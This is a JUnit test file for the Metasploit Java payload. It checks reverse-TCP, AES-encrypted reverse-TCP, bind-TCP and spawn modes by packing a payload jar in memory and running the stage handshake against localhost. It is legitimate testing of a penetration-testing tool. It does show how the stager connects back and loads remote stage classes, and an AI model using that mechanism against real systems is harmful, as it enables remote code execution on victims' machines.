package metasploit;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Properties;
import java.util.Random;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.jar.JarOutputStream;
import java.util.zip.ZipEntry;

import javapayload.stage.DummyStage;
import javapayload.stage.Stage;
import javapayload.stage.StreamForwarder;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import junit.framework.Assert;
import junit.framework.TestCase;

import com.metasploit.meterpreter.MemoryBufferURLConnection;

public class PayloadTest extends TestCase {

	public void testReverseTCP() throws Exception {
		ServerSocket ss = new ServerSocket(0);
		final Properties metasploitDat = new Properties();
		metasploitDat.setProperty("LHOST", ""+InetAddress.getLocalHost().getHostAddress());
		metasploitDat.setProperty("LPORT", ""+ss.getLocalPort());
		ExecutorService tempThread = Executors.newFixedThreadPool(1);
		Future handle = tempThread.submit(new Callable() {
			public Object call() throws Exception {
				return runPayload(metasploitDat, null);			
			}
		});
		ss.setSoTimeout(1000);
		try {
			Socket s = ss.accept();
			handleSocketCommunication(s);
		} catch (SocketTimeoutException ex) {
			handle.get();
			throw ex;
		}
		ss.close();
		Assert.assertNull(handle.get());
		tempThread.shutdown();
	}

	public void testAESReverseTCP() throws Exception {
		final String KEY = "ThisIsMyUnitTest";
		ServerSocket ss = new ServerSocket(0);
		final Properties metasploitDat = new Properties();
		metasploitDat.setProperty("LHOST", ""+InetAddress.getLocalHost().getHostAddress());
		metasploitDat.setProperty("LPORT", ""+ss.getLocalPort());
		metasploitDat.setProperty("AESPassword", KEY);
		ExecutorService tempThread = Executors.newFixedThreadPool(1);
		Future handle = tempThread.submit(new Callable() {
			public Object call() throws Exception {
				return runPayload(metasploitDat, AESEncryption.class);
			}
		});
		ss.setSoTimeout(5000);
		try {
			Socket s = ss.accept();
			DataOutputStream out = new DataOutputStream(s.getOutputStream());
			DataInputStream in = new DataInputStream(s.getInputStream());
			out.writeInt(0);
			SecureRandom sr = new SecureRandom();
			byte[] outIV = new byte[16];
			sr.nextBytes(outIV);
			out.write(outIV);
			out.flush();
			byte[] inIV = new byte[16];
			in.readFully(inIV);
			byte[] keyBytes = MessageDigest.getInstance("MD5").digest(KEY.getBytes());
			Cipher co = Cipher.getInstance("AES/CFB8/NoPadding");
			co.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(keyBytes, "AES"), new IvParameterSpec(outIV), sr);
			Cipher ci = Cipher.getInstance("AES/CFB8/NoPadding");
			ci.init(Cipher.DECRYPT_MODE, new SecretKeySpec(keyBytes, "AES"), new IvParameterSpec(inIV), sr);
			handleSocketCommunication(new CipherOutputStream(out, co), new CipherInputStream(in, ci));
			s.close();
		} catch (SocketTimeoutException ex) {
			handle.get();
			throw ex;
		}
		ss.close();
		Assert.assertNull(handle.get());
		tempThread.shutdown();
	}

	public void testBindTCP() throws Exception {
		ServerSocket ss = new ServerSocket(0);
		int port = ss.getLocalPort();
		ss.close();
		final Properties metasploitDat = new Properties();
		metasploitDat.setProperty("LPORT", ""+port);
		ExecutorService tempThread = Executors.newFixedThreadPool(1);
		Future handle = tempThread.submit(new Callable() {
			public Object call() throws Exception {
				return runPayload(metasploitDat, null);			
			}});
		Socket s = new Socket(InetAddress.getLocalHost(), port);
		handleSocketCommunication(s);
		ss.close();
		Assert.assertNull(handle.get());
		tempThread.shutdown();
	}

	public void testSpawnReverseTCP() throws Exception {
		ServerSocket ss = new ServerSocket(0);
		final Properties metasploitDat = new Properties();
		metasploitDat.setProperty("LHOST", ""+InetAddress.getLocalHost().getHostAddress());
		metasploitDat.setProperty("LPORT", ""+ss.getLocalPort());
		metasploitDat.setProperty("Spawn", "2");
		Assert.assertNull(runPayload(metasploitDat, null));	
		ss.setSoTimeout(10000);
		Socket s = ss.accept();
		handleSocketCommunication(s);
		ss.close();
	}

	private Object runPayload(final Properties metasploitDat, Class extraClass) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException, Exception {
		return setUpClassLoader(metasploitDat, extraClass).loadClass("metasploit.Payload").getMethod("main", new Class[] {String[].class}).invoke(null, new Object[] {new String[0]});
	}

	private URLClassLoader setUpClassLoader(Properties metasploitDat, Class extraClass) throws Exception {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		StreamForwarder.forward(Payload.class.getResourceAsStream(Payload.class.getSimpleName()+".class"), baos);
		byte[] payloadClass = baos.toByteArray(), instrumentedPayloadClass = null;
		baos.reset();
		// load the uninstrumented class as resource when running unter Cobertura so that Spawn will work
		try {
			ClassLoader loader = Class.forName("net.sourceforge.cobertura.coveragedata.CoverageDataFileHandler").getClassLoader();
			if (loader instanceof URLClassLoader && ((URLClassLoader) loader).getURLs().length == 1) {
				File jarFile = new File(((URLClassLoader)loader).getURLs()[0].toURI());
				if (jarFile.getName().startsWith("surefirebooter")) {
					File origFile = new File(jarFile.getParentFile().getParentFile(), "classes/metasploit/Payload.class");
					StreamForwarder.forward(new FileInputStream(origFile), baos);
					instrumentedPayloadClass = payloadClass;
					payloadClass = baos.toByteArray();
					baos.reset();
				}
			}
		} catch (ClassNotFoundException ex) {}
		byte[] extraClassBytes = null;
		if (extraClass != null) {
			StreamForwarder.forward(extraClass.getResourceAsStream(extraClass.getSimpleName()+".class"), baos);
			extraClassBytes = baos.toByteArray();
			baos.reset();	
		}
		JarOutputStream jos = new JarOutputStream(baos);
		jos.putNextEntry(new ZipEntry("metasploit.dat"));
		metasploitDat.store(jos, null);
		jos.putNextEntry(new ZipEntry("metasploit/Payload.class"));
		jos.write(payloadClass);
		if (extraClass != null) {
			jos.putNextEntry(new ZipEntry(extraClass.getName().replace('.','/')+".class"));
			jos.write(extraClassBytes);
		}
		jos.close();
		byte[] payloadJar = baos.toByteArray();
		final byte[] classToDefine = instrumentedPayloadClass;
		return new URLClassLoader(new URL[] {MemoryBufferURLConnection.createURL(payloadJar, "application/jar")}) {
			{
				if (classToDefine != null) {
					defineClass(null, classToDefine, 0, classToDefine.length);
				}
			}
			protected synchronized Class loadClass(String name, boolean resolve) throws ClassNotFoundException {
				// do not load classes from metasploit package from parent class loader!
				if (name.startsWith("metasploit.")) {
					Class clazz = findLoadedClass(name);
					if (clazz == null) {
						clazz = findClass(name);
						if (resolve) {
							resolveClass(clazz);
						}
					}
					return clazz;
				} else {
					return super.loadClass(name, resolve);
				}
			}
			
			public URL getResource(String name) {
				URL result = findResource(name);
				if (result != null)
					return result;
				return super.getResource(name);
			}
		};
	}

	private void handleSocketCommunication(Socket socket) throws Exception {
		handleSocketCommunication(socket.getOutputStream(), socket.getInputStream());
		socket.close();
	}

	private void handleSocketCommunication(OutputStream out, InputStream in) throws Exception {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		StreamForwarder.forward(Stage.class.getResourceAsStream(Stage.class.getSimpleName()+".class"), baos, false);
		byte[] stageClass = baos.toByteArray();
		baos.reset();
		StreamForwarder.forward(DummyStage.class.getResourceAsStream(DummyStage.class.getSimpleName()+".class"), baos);
		byte[] dummyStageClass = baos.toByteArray();
		baos.close();
		DataOutputStream dos = new DataOutputStream(out);
		dos.writeInt(stageClass.length);
		dos.write(stageClass);
		dos.writeInt(dummyStageClass.length);
		dos.write(dummyStageClass);
		dos.writeInt(0);
		byte[] randomData = new byte[4096];
		new Random().nextBytes(randomData);
		dos.writeInt(randomData.length);
		dos.write(randomData);
		dos.flush();
		DataInputStream dis = new DataInputStream(in);
		byte[] roundtripData = new byte[4096];
		dis.readFully(roundtripData);
		String[] params = new String[dis.readInt()];
		for (int i = 0; i < params.length; i++) {
			params[i] = dis.readUTF();
		}
		Assert.assertEquals(-1, dis.read());
		Assert.assertEquals(2, params.length);
		Assert.assertEquals("Payload", params[0]);
		Assert.assertEquals("--", params[1]);
	}
}
